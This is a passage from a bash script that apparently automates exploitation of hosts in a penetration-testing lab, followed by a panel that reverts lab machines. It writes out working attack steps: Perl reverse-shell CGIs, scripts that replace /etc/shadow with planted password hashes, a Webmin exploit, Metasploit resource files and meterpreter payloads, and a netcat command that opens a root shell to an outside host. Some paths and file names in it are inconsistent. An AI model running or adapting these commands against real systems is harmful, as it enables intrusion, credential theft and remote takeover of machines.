                             sed -r "s/port \= 1234\;/port \= 4321\;/g" > /var/www/fc42/fc4211.cgi
                            fi

                            if [ ! -f /var/www/fc42/fc4213.cgi ]; then
                             cat /var/www/fc42/perl-reverse-shell-1.0/perl-reverse-shell.pl |\
                             sed -r "s/ip \= '127.0.0.1'\;/ip \= '10.10.12.10'\;/g" |\
                             sed -r "s/port \= 1234\;/port \= 4321\;/g" > /var/www/fc42/fc4213.cgi
                            fi

                            if [ ! -f /var/www/fc42/fc4215.cgi ]; then 
                             cat /var/www/fc42/perl-reverse-shell-1.0/perl-reverse-shell.pl |\
                             sed -r "s/ip \= '127.0.0.1'\;/ip \= '10.10.14.10'\;/g" |\
                             sed -r "s/port \= 1234\;/port \= 4321\;/g" > /var/www/fc42/fc4215.cgi
                            fi

# make the evil.cgi

                            if [ ! -f /var/www/fc42/evil211.cgi ]; then 
                             echo -e '#!/usr/bin/perl\nuse File::Copy;\n$oldlocation = "/etc/shadow-";\n$newlocation = "/etc/shadow-.old";\nmove($oldlocation, $newlocation);\n$oldlocation = "/etc/shadow";\n$newlocation = "/etc/shadow.old";\nmove($oldlocation, $newlocation);\n$evilshadows = "/home/alice/shadow";\nmove($evilshadows, $oldlocation);' > /var/www/fc4/evil11.cgi
                            fi
                            if [ ! -f /var/www/fc42/evil213.cgi ]; then 
                             echo -e '#!/usr/bin/perl\nuse File::Copy;\n$oldlocation = "/etc/shadow-";\n$newlocation = "/etc/shadow-.old";\nmove($oldlocation, $newlocation);\n$oldlocation = "/etc/shadow";\n$newlocation = "/etc/shadow.old";\nmove($oldlocation, $newlocation);\n$evilshadows = "/home/alice/shadow";\nmove($evilshadows, $oldlocation);' > /var/www/fc4/evil13.cgi
                            fi
                            if [ ! -f /var/www/fc42/evil215.cgi ]; then 
                             echo -e '#!/usr/bin/perl\nuse File::Copy;\n$oldlocation = "/etc/shadow-";\n$newlocation = "/etc/shadow-.old";\n$oldlocation = "/etc/shadow";\n$newlocation = "/etc/shadow.old";\nmove($oldlocation, $newlocation);\nmove($oldlocation, $newlocation);\n$evilshadows = "/home/alice/shadow";\nmove($evilshadows, $oldlocation);' > /var/www/fc4/evil15.cgi
                            fi

# make evil/shadow file

                            if [ ! -f /var/www/fc42/evil.shadow ]; then 
                             echo -e 'root:$1$8UpmX7yC$Fytsj3S1Thy/PbliY7Cfj1:14680:0:99999:7:::' > /var/www/fc42/evil.shadow
                             echo -e 'bin:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'daemon:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'adm:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'lp:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'sync:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'shutdown:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'halt:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'mail:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'news:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'uucp:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'operator:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'games:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'gopher:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'ftp:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'nobody:*:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'dbus:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'vcsa:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'rpm:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'haldaemon:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'pcap:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'nscd:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'named:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'netdump:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'sshd:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'rpc:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'mailnull:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'smmsp:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'rpcuser:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'nfsnobody:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'apache:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'squid:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'webalizer:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'xfs:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'ntp:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'mysql:!!:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'bob:$1$g5gebnsY$ioI7NilK5pnXC4vwT7Nqq0:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                             echo -e 'alice:$1$8UpmX7yC$Fytsj3S1Thy/PbliY7Cfj1:13653:0:99999:7:::' >> /var/www/fc42/evil.shadow
                            fi

# start the exploitation process

                            if [ $uip == "10.10.11.242" ]; then
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Reverse shell catcher fc42' -e nc -lvp 4321 &
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Unathenticated shell launch' -e expect -c 'spawn ssh -o StrictHostKeyChecking=no alice@10.10.11.242 wget http://10.10.10.12/fc42/fc4211.cgi -O /home/alice/fc4211.cgi && chmod 777 ./fc4211.cgi; sleep 60 ; expect password ; send "alice\n" ; interact' &
                            sleep 60
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc42 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.11.242 10000 /home/alice/fc4211.cgi 0 
                            sleep 5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc42 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.11.242 10000 /home/alice/fc4211.cgi 0 
                            sleep5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc42 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.11.242 10000 /home/alice/fc4211.cgi 0 
                            fi

                            if [ $uip == "10.10.13.242" ]; then
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Reverse shell catcher fc42' -e nc -lvp 4321 &
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Unathenticated shell launch' -e expect -c 'spawn ssh -o StrictHostKeyChecking=no alice@10.10.13.242 wget http://10.10.12.10/fc42/fc4213.cgi -O /home/alice/fc4213.cgi && chmod 777 ./fc4213.cgi; sleep 60 ; expect password ; send "alice\n" ; interact' &
                            sleep 60
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc42 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.13.242 10000 /home/alice/fc4213.cgi 0 
                            sleep 5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc42 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.13.242 10000 /home/alice/fc4213.cgi 0 
                            sleep5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc42 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.13.242 10000 /home/alice/fc4213.cgi 0 
                            fi

                            if [ $uip == "10.10.15.242" ]; then
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Reverse shell catcher fc42' -e nc -lvp 4321 &
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Unathenticated shell launch' -e expect -c 'spawn ssh -o StrictHostKeyChecking=no alice@10.10.15.242 wget http://10.10.14.10/fc42/fc4215.cgi -O /home/alice/fc4215.cgi && chmod 777 ./fc4215.cgi; sleep 60 ; expect password ; send "alice\n" ; interact' &
                            sleep 60
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc42 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.15.242 10000 /home/alice/fc4215.cgi 0 
                            sleep 5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc42 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.15.242 10000 /home/alice/fc4215.cgi 0 
                            sleep5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc42 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.15.242 10000 /home/alice/fc4215.cgi 0 
                            fi

                            else

                             if [ `echo $uip | cut -d"." -f4` == "245" ]; then
                              

                              if [ ! -f $msfs/helpdesk11.rc ]; then
                               echo -e "use windows/smb/ms09_050_smb2_negotiate_func_index" >> $msfs/helpdesk11.rc
                               echo -e "set rhost 10.10.11.245" >> $msfs/helpdesk11.rc
                               echo -e "set lhost 10.10.10.12" >> $msfs/helpdesk11.rc
                               echo -e "set lport 443" >> $msfs/helpdesk11.rc
                               echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/helpdesk11.rc
                               echo -e "set DisablePayloadHandler True" >> $msfs/helpdesk11.rc
                               echo -e "exploit" >> $msfs/helpdesk11.rc
                               echo -e "exit" >> $msfs/helpdesk11.rc
                              fi

                              if [ ! -f $msfs/helpdesk13.rc ]; then
                               echo -e "use windows/smb/ms09_050_smb2_negotiate_func_index" >> $msfs/helpdesk13.rc
                               echo -e "set rhost 10.10.13.245" >> $msfs/helpdesk13.rc
                               echo -e "set lhost 10.10.12.10" >> $msfs/helpdesk13.rc
                               echo -e "set lport 443" >> $msfs/helpdesk13.rc
                               echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/helpdesk13.rc
                               echo -e "set DisablePayloadHandler True" >> $msfs/helpdesk13.rc
                               echo -e "exploit" >> $msfs/helpdesk13.rc
                               echo -e "exit" >> $msfs/helpdesk13.rc
                              fi

                              if [ ! -f $msfs/helpdesk15.rc ]; then
                               echo -e "use windows/smb/ms09_050_smb2_negotiate_func_index" >> $msfs/helpdesk15.rc
                               echo -e "set rhost 10.10.15.245" >> $msfs/helpdesk15.rc
                               echo -e "set lhost 10.10.14.10" >> $msfs/helpdesk15.rc
                               echo -e "set lport 443" >> $msfs/helpdesk15.rc
                               echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/helpdesk15.rc
                               echo -e "set DisablePayloadHandler True" >> $msfs/helpdesk15.rc
                               echo -e "exploit" >> $msfs/helpdesk15.rc
                               echo -e "exit" >> $msfs/helpdesk15.rc
                              fi

                              if [ $uip == "10.10.11.245" ]; then
                               xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "then how did he email the help desk?" -e $msfc -r $msfs/helpdesk11.rc
                               sleep 190s
                               ps -A xf | grep -v grep | grep helpdesk | grep xterm | cut -d" " -f1 | xargs kill -9
                              fi

                              if [ $uip == "10.10.13.245" ]; then
                               xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "then how did he email the help desk?" -e $msfc -r $msfs/helpdesk13.rc
                               sleep 190s
                               ps -A xf | grep -v grep | grep helpdesk | grep xterm | cut -d" " -f1 | xargs kill -9
                              fi

                              if [ $uip == "10.10.15.245" ]; then
                               xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "then how did he email the help desk?" -e $msfc -r $msfs/helpdesk15.rc
                               sleep 190s
                               ps -A xf | grep -v grep | grep helpdesk | grep xterm | cut -d" " -f1 | xargs kill -9
                              fi

                             else

                              if [ `echo $uip | cut -d"." -f4` == "247" ]; then

                               if [ ! -d /var/www/cory ];then
                                mkdir /var/www/cory
                               fi

                               if [ ! -f /var/www/cory/evil11.exe ];then
                                /pentest/exploits/framework3/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=443 X > /var/www/cory/evil11.exe
                               fi

                               if [ ! -f /var/www/cory/evil13.exe ];then
                                /pentest/exploits/framework3/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=443 X > /var/www/cory/evil13.exe
                               fi

                               if [ ! -f /var/www/cory/evil15.exe ];then
                                /pentest/exploits/framework3/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=443 X > /var/www/cory/evil15.exe
                               fi

# start exploitation process

                               if [ $uip == "10.10.11.247" ]; then
                                xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cory Instruction set" -e "echo -e '\nDefault pass:\tilovesecurity\n\nYou need to direct Cory through IE to your evil web server and download and run\nthe local priv. exploit to get System/NT_Atuh on this machine.\n\nThe address is:\thttp://10.10.10.12/cory/evil.exe' && sleep 500" & 
                                xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cory 11 Subnet msterm" -e rdesktop -s cmd.exe -u cory -p ilovesecurity -A 10.10.11.247 &
                               fi

                               if [ $uip == "10.10.13.247" ]; then
                                xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cory Instruction set" -e "echo -e '\nDefault pass:\tilovesecurity\n\nYou need to direct Cory through IE to your evil web server and download and run\nthe local priv. exploit to get System/NT_Atuh on this machine.\n\nThe address is:\thttp://10.10.12.10/cory/evil.exe' && sleep 500" & 
                                xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cory 13 Subnet msterm" -e rdesktop -s cmd.exe -u cory -p ilovesecurity -A 10.10.13.247
                               fi

                               if [ $uip == "10.10.15.247" ]; then
                                xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cory Instruction set" -e "echo -e '\nDefault pass:\tilovesecurity\n\nYou need to direct Cory through IE to your evil web server and download and run\nthe local priv. exploit to get System/NT_Atuh on this machine.\n\nThe address is:\thttp://10.10.14.10/cory/evil.exe' && sleep 500" & 
                                xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Cory 15 Subnet msterm" -e rdesktop -s cmd.exe -u cory -p ilovesecurity -A 10.10.15.247
                               fi
                            
                              else

                               if [ `echo $uip | cut -d"." -f4` == "249" ]; then

# start debian resource file structure

                                if [ ! -f $msfs/debian11.rc ]; then 
                                 echo -e "use linux/ftp/proftp_telnet_iac" > $msfs/debian11.rc
                                 echo -e "set RHOST 10.10.11.249" >> $msfs/debian11.rc
                                 echo -e "set target 2" >> $msfs/debian11.rc
                                 echo -e "set DisablePayloadHandler true" >> $msfs/debian11.rc
                                 echo -e "setRPORT 443" >> $msfs/debian11.rc
                                 echo -e "exploit" >> $msfs/debian11.rc
                                 echo -e "exit" >> $msfs/debian11.rc
                                fi

                                if [ ! -f $msfs/debian13.rc ]; then 
                                 echo -e "use linux/ftp/proftp_telnet_iac" > $msfs/debian11.rc
                                 echo -e "set RHOST 10.10.13.249" >> $msfs/debian11.rc
                                 echo -e "set target 2" >> $msfs/debian11.rc
                                 echo -e "set DisablePayloadHandler true" >> $msfs/debian11.rc
                                 echo -e "setRPORT 443" >> $msfs/debian11.rc
                                 echo -e "exploit" >> $msfs/debian11.rc
                                 echo -e "exit" >> $msfs/debian11.rc
                                fi

                                if [ ! -f $msfs/debian15.rc ]; then 
                                 echo -e "use linux/ftp/proftp_telnet_iac" > $msfs/debian11.rc
                                 echo -e "set RHOST 10.10.15.249" >> $msfs/debian11.rc
                                 echo -e "set target 2" >> $msfs/debian11.rc
                                 echo -e "set DisablePayloadHandler true" >> $msfs/debian11.rc
                                 echo -e "setRPORT 443" >> $msfs/debian11.rc
                                 echo -e "exploit" >> $msfs/debian11.rc
                                 echo -e "exit" >> $msfs/debian11.rc
                                fi

# start debian exploitation process

                                if [ $uip == "10.10.11.249" ]; then
                                 xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Debian ProFTP" -e $msfc -r $msfs/debian11.rc             
                                fi
                                if [ $uip == "10.10.13.249" ]; then
                                 xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Debian ProFTP" -e $msfc -r $msfs/debian13.rc                                 
                                fi
                                if [ $uip == "10.10.15.249" ]; then
                                 xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Debian ProFTP" -e $msfc -r $msfs/debian15.rc
                                fi
                             
                               else

                                if [ `echo $uip | cut -d"." -f4` == "251" ]; then

                                 xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Evil Sean to root ssh" -e expect -c 'spawn ssh -o StrictHostKeyChecking=no sean@10.10.13.251 "echo /dev/null | sudo -S su" ; sleep 10 ; expect password ; send "/dev/null\n" ; interact' && expect -c 'spawn ssh -o StrictHostKeyChecking=no sean@10.10.13.251 "sudo nc -vvn 10.10.12.10 4576 -e /bin/sh &" ; sleep 10 ; expect password ; send "/dev/null\n" ; interact'
              
                                else
                                 if [ `echo $uip | cut -d"." -f4` == "252" ]; then
                                  echo test
                                 fi
                                fi
                               fi
                              fi
                             fi
                            fi
                           fi
                          fi
                         fi
                        fi
                       fi
                      fi
                     fi
                    fi
                   fi
                  fi
                 fi
                fi
               fi
              fi
             fi
            fi
           fi
          fi
         fi
        fi
       fi
      fi 
     fi
    fi
   fi
  fi
 fi
fi

fi

# end pop

# Checking id used spawned terminals and killing them as needed!

#if [ `echo $uip | cut -d"." -f4` == "203" ]; then
# echo -e "\n\n[*] Do you wish to kill the spawned terminals for this hack on "$uip
# read death
# if [ $rev == "Y" && $rev == "y" ];then
#  ps -A xf | grep bobmh.rc | grep "ruby" | cut -d " " -f1 | xargs kill -9
# else
#  echo -e "\n\n[*] Leaving spawned terminals open for "$uip 
# fi
#fi

#if [ `echo $uip | cut -d"." -f4` == "204" ]; then
# echo -e "\n\n[*] Do you wish to kill the spawned terminals for this hack on "$uip
# read death
# if [ $rev == "Y" ];then
#  ps -A xf | grep bobmh2.rc | grep "ruby" | cut -d " " -f1 | xargs kill -9
# else
#  echo -e "\n\n[*] Leaving spawned terminals open for "$uip 
# fi
#fi

################################################################################

# reverting panel ;)

if [ $select == "revert" ];then

#echo -e "\n\n[*] Do you wish to revert the machine "$uip
#echo -e "\n\t\t[*] Please enter (Y) for Yes or (ANYTHING) else for No\n"

echo -e "\n\n[*] Please enter an IP address of the machine you wish to revert\n\t"


read uip

echo -e "\n\n\t[*] Do you wish to revert the machine "$uip
echo -e "\n\t\t[*] Please enter (Y) for Yes or (ANYTHING) else for No\n"
read rev

if [ $rev == "Y" ];then
 
 if [ `echo $uip | cut -d'.' -f3` == "15" ]; then

# revert alice
  
  if [ $uip == "10.10.15.201" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert ghost

  if [ $uip == "10.10.15.202" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert bob1

  if [ $uip == "10.10.15.203" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert bob2

  if [ $uip == "10.10.15.204" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert oracle

  if [ $uip == "10.10.15.205" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert oracle 2

  if [ $uip == "10.10.15.206" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert pedro

  if [ $uip == "10.10.15.207" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert phoenix

  if [ $uip == "10.10.15.208" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert cacti

  if [ $uip == "10.10.15.209" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert trixbox

  if [ $uip == "10.10.15.211" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert redhat

  if [ $uip == "10.10.15.215" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert redhat9

  if [ $uip == "10.10.15.217" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert master

  if [ $uip == "10.10.15.220" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert slave 

  if [ $uip == "10.10.15.221" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert mailman

  if [ $uip == "10.10.15.222" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert jeff

  if [ $uip == "10.10.15.223" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert ubuntu05

  if [ $uip == "10.10.15.224" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert joe

  if [ $uip == "10.10.15.226" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert srv2

  if [ $uip == "10.10.15.227" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert thincmail

  if [ $uip == "10.10.15.229" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert kevin

  if [ $uip == "10.10.15.230" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert ralph

  if [ $uip == "10.10.15.231" ]; then 
   wget  --no-check-certificate --post-data=awlAction=login\&awlUserName=OSIDNUM\&awlPasswd=`cat $PASSWORDFILE  | grep -v "USERNAME"`\&ip=$uip\&type=servers\&ip=$uip\&strike=2\&location=vm21 https://10.10.10.7/functions/revert_machine_admin.php? && rm -rf ./revert_machine_admin.php*
  fi

# revert gentoo

  if [ $uip == "10.10.15.234" ]; then 
